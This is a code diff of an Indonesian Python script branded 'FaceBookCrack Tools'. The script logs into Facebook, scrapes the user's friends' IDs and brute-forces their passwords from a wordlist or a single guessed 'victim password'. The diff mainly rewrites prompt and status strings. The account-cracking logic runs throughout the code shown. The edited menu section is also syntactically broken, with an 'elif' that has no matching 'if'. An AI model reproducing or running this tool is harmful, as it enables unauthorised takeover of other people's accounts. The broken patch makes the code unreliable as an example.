@@ -103,9 +103,9 @@ def buka(d):
 		return x
 def login():
 	global log
-	us = inputD('[?]Email/HP')
-	pa = inputD('[?]Kata Sandi')
-	tampil('\rh[*]Sedang Login....')
+	us = inputD('?> Gmail or HP')
+	pa = inputD('?>Kata Sandi')
+	tampil('\rc %Sedang Login....')
 	buka('https://m.facebook.com')
 	br.select_form(nr=0)
 	br.form['email']=us
@@ -113,17 +113,17 @@ def login():
 	br.submit()
 	url = br.geturl()
 	if 'save-device' in url or 'm_sess' in url:
-		tampil('\rh[*]Login Berhasil')
+		tampil('\rc Login Done !')
 		buka('https://mobile.facebook.com/home.php')
 		nama = br.find_link(url_regex='logout.php').text
 		nama = re.findall(r'\((.*a?)\)',nama)[0]
-		tampil('\rh[*]Selamat datang \rk%s\n\rh[*]Semoga ini adalah hari keberuntungan mu....'%nama)
+		tampil('\rh >Welcome To My TOOLS :v \rk%s\n\rh %Sedang Mempesiapkan Alat :V ....'%nama)
 		log = 1
 	elif 'checkpoint' in url:
-		tampil('\rm[!]Akun kena checkpoint\n\rk[!]Coba Login dengan opera mini')
+		tampil('\rm =>Duh Kasian Akun kena checkpoint :( \n\rk =>Coba Login dengan opera mini :V')
 		keluar()
 	else:
-		tampil('\rm[!]Login Gagal')
+		tampil('\rm =>Akun Mu Salah Cok !')
 def saring_id_teman(r):
 	for i in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
 		id_bteman.append(i)
@@ -175,7 +175,7 @@ def idgroup():
 		return menu()
 def idteman():
 	if log != 1:
-		tampil('\rh[*]Login dulu bos...')
+		tampil('\rc 0=====[ LOGIN ]=====0')
 		login()
 		if log == 0:
 			keluar()
@@ -184,19 +184,19 @@ def idteman():
 		next = br.find_link(url_regex= 'friends_center_main').url
 	except:
 		if len(id_teman) != 0:
-			tampil('\rm[!]Hanya dapat mengambil \rp%d id'%len(id_bteman))
+			tampil('\rk 0>Terambil \rp%d id'%len(id_bteman))
 		else:
-			tampil('\rm[!]Batal')
+			tampil('\rm =>Batal ?')
 			keluar()
 	while 1:
 		saring_id_teman(buka(next))
 		try:
 			next = br.find_link(url_regex= 'friends_center_main').url
 		except:
-			tampil('\rm[!]Hanya dapat mengambil \rp%d id'%len(id_bteman))
+			tampil('\rk 0>Terambil \rp%d id'%len(id_bteman))
 			break
 	simpan()
-	i = inputD('[?]Langsung Crack (y/t)',['Y','T'])
+	i = inputD(' \rc  %OTW Crack {y/t} ?',['Y','T'])
 	if i.upper() == 'Y':
 		return crack(id_bteman)
 	else:
@@ -223,29 +223,30 @@ class mt(threading.Thread):
             self.a = 2
         else:
             self.a = 0
+
 def crack(d):
-	i = inputD('[?]Pake Passwordlist/Manual (p/m)',['P','M'])
+	i = inputD('\rm Pake Wordlist or Manual {p/m} ?',['P','M'])
 	if i.upper() == 'P':
 		while 1:
-			dir = inputD('[?]Masukan alamat file')
+			dir = inputD('\rm Masukin alamat filenya :V ')
 			try:
 				D = open(dir,'r').readlines()
 			except:
-				tampil('\rm[!]Gagal membuka \rk%s'%dir)
+				tampil('\rm =>Gagal Dibuka \rk%s'%dir)
 				continue
 			break
-		tampil('\rh[*]Memulai crack dengan \rk%d password'%len(D))
+		tampil('\rh +Mulai crack dengan \rk%d password'%len(D))
 		for i in D:
 			i = i.replace('\n','')
 			if len(i) != 0:
 				crack0(d,i,0)
-		i = inputD('[?]Tidak Puas dengan Hasil,Mau coba lagi (y/t)',['Y','T'])
+		i = inputD('\rm => Belum Puas,Mau coba lagi? :V {y/t}',['Y','T'])
 		if i.upper() == 'Y':
 			return crack(d)
 		else:
 			return menu()
 	else:
-		return crack0(d,inputD('[?]Sandi'),1)
+		return crack0(d,inputD(' ?>Sandi Korban'),1)
 def crack0(data,sandi,p):
 	tampil('\rh[*]MengCrack \rk%d Akun \rhdengan sandi \rm[\rk%s\rm]'%(len(data),sandi))
 	print('\033[32;1m[*]Cracking \033[31;1m[\033[36;1m0%\033[31;1m]\033[0m',end='')
@@ -339,15 +340,13 @@ def menu():
      \rm[ \rc+ \rm] \rh WA    : 0895611252563 & 089620134992      
      \rk------------- FaceBookCrack Tools -------------
 ''')
-	tampil('''\rk%s\n\rc1 \rhAmbil id dari daftar teman\n\rc2 \rmKELUAR\n\rk%s'''%('#'*20,'#'*20))
-	i = inputM('\rc +FacebookCrack+ ')
-	if i == 1:
-		lanjutG()
-		idgroup()
-	elif i == 2:
+	tampil('''\rk%s\n\rc1 \rh Login \n\rc2 \rmKELUAR\n\rk%s'''%('#'*20,'#'*20))
+	i = inputM('root@Karjok:~#',[1,2])
+
+	elif i == 1:
 		lanjutT()
 		idteman()
-	elif i == 3:
+	elif i == 2:
 		keluar()
 bacaData()
 menu()
